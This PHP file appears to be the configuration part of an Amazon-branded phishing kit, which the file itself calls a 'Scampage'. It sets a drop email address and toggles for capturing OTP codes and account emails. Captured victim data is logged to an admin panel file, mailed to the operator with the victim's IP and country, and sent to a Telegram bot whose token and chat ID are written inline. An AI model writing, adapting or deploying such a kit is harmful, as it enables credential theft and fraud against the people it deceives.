<?php
/**

                                                                                                       𝔸𝕄𝔸ℤOℕ
                                                                                                      
#==================================================================================================
/** ʜᴇʀᴇ ʙᴇʟᴏᴡ ⤵ ʏᴏᴜ ᴄᴀɴ ᴘᴜᴛ ʏᴏᴜʀ Email Info 📩 **/                                              #
$yourmail  = 'email@email.com';                                                        #
#==================================================================================================

#==================================================================================================
/** ʜᴇʀᴇ ʙᴇʟᴏᴡ ⤵ u can change ur Scampage configuration into OFF/ON ✅  **/                      #
$OTP = "OFF";                                                                                      #
$ACSEAMAIL = "ON";                                                                                #
#==================================================================================================

#===================================================================================================
/** ʜᴇʀᴇ ʙᴇʟᴏᴡ ⤵ Admin Panel : https://yourlink.com/admin.php 🌐 **/                              #
$f = fopen("../../admin.php", "a");                                                                #
	fwrite($f, $msgbank);                                                                          #
#===================================================================================================

#===================================================================================================
$subject  = " ".$_SESSION['email']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";  #
$headers .= "From: 🎁ᗩⲘᗩⲌ〇Ｎ🎁 BY MR CODER_X 🖕😷🖕 " . "\r\n";                                      #
mail($yourmail, $subject, $yagmail, $headers);                                                     #
#===================================================================================================

#===================================================================================================
/** ʜᴇʀᴇ ʙᴇʟᴏᴡ ⤵ ʏᴏᴜ ᴄᴀɴ ᴘᴜᴛ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ʙᴏᴛ 💬**/                                              #
$botToken='1923090392:AAHQ-EWa2uZXUxcS7dBYx09fZAPmRUC2qaE'; // Your bot ID:TOKEN 
$chatId='-1885271289';  // Your Telegram ID 
  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$yagmai,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);                                                                      #
#===================================================================================================